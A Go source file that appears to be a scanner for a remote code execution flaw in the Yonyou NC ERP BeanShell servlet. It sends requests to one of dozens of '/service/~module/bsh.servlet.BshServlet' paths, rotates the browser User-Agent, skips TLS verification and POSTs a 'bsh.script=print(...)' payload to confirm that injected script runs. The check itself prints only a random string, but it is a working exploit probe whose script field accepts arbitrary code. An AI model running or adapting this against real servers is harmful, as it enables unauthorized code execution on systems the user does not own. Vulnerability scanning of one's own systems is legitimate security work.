package nc

import (
	"crypto/tls"
	"io/ioutil"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

type resps struct {
	url        string
	body       string
	statuscode int
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandStringRunes(n int) string {
	// 生成随机字符串
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func rndua() string {
	ua := []string{"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
		"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
		"Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
		"Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
		"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows; Intel Windows) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67"}
	n := rand.Intn(13) + 1
	return ua[n]
}

func rdnendpoint() string {
	keys := []string{"/service/~aim/bsh.servlet.BshServlet",
		"/service/~alm/bsh.servlet.BshServlet",
		"/service/~ampub/bsh.servlet.BshServlet",
		"/service/~arap/bsh.servlet.BshServlet",
		"/service/~aum/bsh.servlet.BshServlet",
		"/service/~cc/bsh.servlet.BshServlet",
		"/service/~cdm/bsh.servlet.BshServlet",
		"/service/~cmp/bsh.servlet.BshServlet",
		"/service/~ct/bsh.servlet.BshServlet",
		"/service/~dm/bsh.servlet.BshServlet",
		"/service/~erm/bsh.servlet.BshServlet",
		"/service/~fa/bsh.servlet.BshServlet",
		"/service/~fac/bsh.servlet.BshServlet",
		"/service/~fbm/bsh.servlet.BshServlet",
		"/service/~ff/bsh.servlet.BshServlet",
		"/service/~fip/bsh.servlet.BshServlet",
		"/service/~fipub/bsh.servlet.BshServlet",
		"/service/~fp/bsh.servlet.BshServlet",
		"/service/~fts/bsh.servlet.BshServlet",
		"/service/~fvm/bsh.servlet.BshServlet",
		"/service/~gl/bsh.servlet.BshServlet",
		"/service/~hrhi/bsh.servlet.BshServlet",
		"/service/~hrjf/bsh.servlet.BshServlet",
		"/service/~hrpd/bsh.servlet.BshServlet",
		"/service/~hrpub/bsh.servlet.BshServlet",
		"/service/~hrtrn/bsh.servlet.BshServlet",
		"/service/~hrwa/bsh.servlet.BshServlet",
		"/service/~ia/bsh.servlet.BshServlet",
		"/service/~ic/bsh.servlet.BshServlet",
		"/service/~iufo/bsh.servlet.BshServlet",
		"/service/~modules/bsh.servlet.BshServlet",
		"/service/~mpp/bsh.servlet.BshServlet",
		"/service/~obm/bsh.servlet.BshServlet",
		"/service/~pu/bsh.servlet.BshServlet",
		"/service/~qc/bsh.servlet.BshServlet",
		"/service/~sc/bsh.servlet.BshServlet",
		"/service/~scmpub/bsh.servlet.BshServlet",
		"/service/~so/bsh.servlet.BshServlet",
		"/service/~so2/bsh.servlet.BshServlet",
		"/service/~so3/bsh.servlet.BshServlet",
		"/service/~so4/bsh.servlet.BshServlet",
		"/service/~so5/bsh.servlet.BshServlet",
		"/service/~so6/bsh.servlet.BshServlet",
		"/service/~tam/bsh.servlet.BshServlet",
		"/service/~tbb/bsh.servlet.BshServlet",
		"/service/~to/bsh.servlet.BshServlet",
		"/service/~uap/bsh.servlet.BshServlet",
		"/service/~uapbd/bsh.servlet.BshServlet",
		"/service/~uapde/bsh.servlet.BshServlet",
		"/service/~uapeai/bsh.servlet.BshServlet",
		"/service/~uapother/bsh.servlet.BshServlet",
		"/service/~uapqe/bsh.servlet.BshServlet",
		"/service/~uapweb/bsh.servlet.BshServlet",
		"/service/~uapws/bsh.servlet.BshServlet",
		"/service/~vrm/bsh.servlet.BshServlet",
	}
	n := rand.Intn(54) + 1
	return keys[n]
}

func endpointrequest(url1 string) (*resps, error) {
	Url := url1 + rdnendpoint()
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: transport,
	}
	req, err := http.NewRequest("GET", Url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", rndua())
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	result, _ := ioutil.ReadAll(resp.Body)
	contentType := strings.ToLower(resp.Header.Get("Content-Type"))
	httpbody := string(result)
	httpbody = toUtf8(httpbody, contentType)
	s := resps{Url, httpbody, resp.StatusCode}
	return &s, nil
}

func rcerequest(Url string) (*resps, string, error) {
	random_str := RandStringRunes(16)
	post_data := "bsh.script=print(\"" + random_str + "\");\r\n"
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: transport,
	}
	req, err := http.NewRequest("POST", Url, strings.NewReader(post_data))
	if err != nil {
		return nil, "", err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()
	result, _ := ioutil.ReadAll(resp.Body)
	contentType := strings.ToLower(resp.Header.Get("Content-Type"))
	httpbody := string(result)
	httpbody = toUtf8(httpbody, contentType)
	s := resps{Url, httpbody, resp.StatusCode}
	return &s, random_str, nil
}
